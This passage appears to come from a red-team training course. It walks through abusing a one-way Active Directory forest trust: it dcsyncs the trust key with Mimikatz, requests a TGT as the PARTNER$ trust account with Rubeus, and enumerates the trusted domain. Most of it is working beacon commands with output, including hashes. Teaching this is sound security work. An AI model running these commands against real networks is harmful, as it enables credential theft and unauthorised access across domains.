
An adversary may also find themselves on the 'wrong' side of a one-way trust, i.e. the trusting side.  In this scenario, they are against the direction of access and can not access resources in the trusted domain by design.  Remember that these forest trusts are official security boundaries.

Querying the TDO shows that we're on the outbound side of a one-way trust with _contoso.com_.

```powershell
beacon> getuid
[*] You are PARTNER\vwebber

beacon> ldapsearch (objectClass=trustedDomain)

name: contoso.com
trustDirection: 2
trustAttributes: 8
flatName: CONTOSO
```

Attempting to enumerate the foreign domain will typically fail with error code 49, which means 'invalid credentials'.  This makes everything, including basic enumeration, practically impossible.

```powershell
beacon> ldapsearch (objectClass=domain) --dn DC=contoso,DC=com --attributes name,objectSid --hostname contoso.com

Binding to contoso.com
[-] Bind Failed: 49
```

Under the hood, a TGS-REQ for _krbtgt/CONTOSO.COM_ is hitting the _partner.com_ KDC which returns a `KDC_ERR_S_PRINCIPAL_UNKNOWN` error.  This means the target server was not found in the KDC's database - there is (perhaps obviously) no attempt at a referral as there would be when in the trusted domain.

Interestingly, if you have credential material for a principal in the trusted domain, you can actually impersonate them and access resources in the trusted domain across the network.

```powershell
beacon> make_token CONTOSO\Administrator Passw0rd!
[+] Impersonated CONTOSO\Administrator (netonly)

beacon> ls \\lon-dc-1.contoso.com\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     01/24/2025 13:33:39   $Recycle.Bin
          dir     01/23/2025 13:57:51   $WinREAgent
          dir     01/23/2025 13:47:37   Documents and Settings
          dir     05/08/2021 09:20:24   PerfLogs
          dir     03/18/2025 13:18:21   Program Files
          dir     01/23/2025 15:46:18   Program Files (x86)
          dir     03/18/2025 13:18:02   ProgramData
          dir     01/23/2025 13:47:43   Recovery
          dir     01/29/2025 10:42:20   System Volume Information
          dir     01/24/2025 13:33:21   Users
          dir     01/24/2025 13:49:56   Windows
 12kb     fil     03/18/2025 05:28:14   DumpStack.log.tmp
 1gb      fil     03/18/2025 05:28:14   pagefile.sys
```

In this case, the calling client will perform the ticket exchanges directly with the trusted domain's KDC.  You may be wondering what good that is because how can you get credentials for a user in the trusted domain?  Well, there is one - the trust account.  Remember that the trusted domain gets a trust account created using the flat name of the trusting domain; its password is the shared inter-realm key; and the trusting domain has a copy of that key stored in the TDO.

To obtain that key, begin by grabbing the TDO's `objectGUID` attribute.

```powershell
beacon> ldapsearch (objectClass=trustedDomain) --attributes name,objectGUID

--------------------
name: contoso.com
objectGUID: 288d9ee6-2b3c-42aa-bef8-959ab4e484ed
```

And then `dcsync` it using Mimikatz's `/guid` parameter.

```powershell
beacon> mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}

[DC] 'partner.com' will be the domain
[DC] 'par-dc-1.partner.com' will be the DC server
[DC] Object with GUID '{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : contoso.com

** TRUSTED DOMAIN - Antisocial **

Partner              : contoso.com
 [ Out ] CONTOSO.COM -> PARTNER.COM
    * 14/03/2025 10:27:30 - CLEAR   - cb 87 71 2c 62 c1 2e 70 ae d8 29 5e 6a ae 8c a9 96 39 51 39 10 3a ef 7c 42 6d 2d 97 
	* aes256_hmac       cc19dd9022fb33da79820c340e7c96765f237aa1a5a9dfe889a8f27af12c7a34
	* aes128_hmac       4929a44176077b570d1b6f1eae4f9fbb
	* rc4_hmac_nt       6150491cceb080dffeaaec5e60d8f58d

 [Out-1] CONTOSO.COM -> PARTNER.COM
    * 14/03/2025 10:27:30 - CLEAR   - cb 87 71 2c 62 c1 2e 70 ae d8 29 5e 6a ae 8c a9 96 39 51 39 10 3a ef 7c 42 6d 2d 97 
	* aes256_hmac       cc19dd9022fb33da79820c340e7c96765f237aa1a5a9dfe889a8f27af12c7a34
	* aes128_hmac       4929a44176077b570d1b6f1eae4f9fbb
	* rc4_hmac_nt       6150491cceb080dffeaaec5e60d8f58d
```

`[Out]` and `[Out-1]` are the 'current' and 'previous' keys respectively.  They're the same in this example because 30 days hasn't elapsed since the creation of the trust.  Using the RC4 key, simply ask for a TGT from the trusted domain.

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:PARTNER$ /domain:CONTOSO.COM /dc:lon-dc-1.contoso.com /rc4:6150491cceb080dffeaaec5e60d8f58d /nowrap

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 6150491cceb080dffeaaec5e60d8f58d
[*] Building AS-REQ (w/ preauth) for: 'CONTOSO.COM\PARTNER$'
[*] Using domain controller: 10.10.120.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFZ[...snip...]kNPTQ==

  ServiceName              :  krbtgt/CONTOSO.COM
  ServiceRealm             :  CONTOSO.COM
  UserName                 :  PARTNER$ (NT_PRINCIPAL)
  UserRealm                :  CONTOSO.COM
  StartTime                :  18/03/2025 13:58:52
  EndTime                  :  18/03/2025 23:58:52
  RenewTill                :  25/03/2025 13:58:52
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  dwwauTnm1s6wRz0YxKmFTQ==
  ASREP (key)              :  6150491CCEB080DFFEAAEC5E60D8F58D
```

Once this ticket has been injected into a logon session, you'll be able to enumerate the trusted domain.

```powershell
beacon> run klist

Current LogonId is 0:0x23da426

Cached Tickets: (2)

#0>	Client: PARTNER$ @ CONTOSO.COM
	Server: krbtgt/CONTOSO.COM @ CONTOSO.COM
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize 
	Start Time: 3/18/2025 13:58:52 (local)
	End Time:   3/18/2025 23:58:52 (local)
	Renew Time: 3/25/2025 13:58:52 (local)
	Session Key Type: RSADSI RC4-HMAC(NT)
	Cache Flags: 0x1 -> PRIMARY 
	Kdc Called: 

beacon> ldapsearch (objectClass=domain) --dn DC=contoso,DC=com --attributes name,objectSid --hostname contoso.com

Binding to contoso.com

[*] Distinguished name: DC=contoso,DC=com
[*] Filter: (objectClass=domain)
[*] Scope of search value: 3
[*] Returning specific attribute(s): name,objectSid

--------------------
name: contoso
objectSid: S-1-5-21-3926355307-1661546229-813047887
retreived 1 results total
```

This works because the primaryGroupID of the trust account is 513.  This gives it the same privileges as Domain Users without it being an explicit member of the group, which is all due to legacy Portable Operating System Interface (POSIX) support.  The upshot is that we can now enumerate the trusted domain to find vulnerabilities such as roastable users, ADCS instances, etc.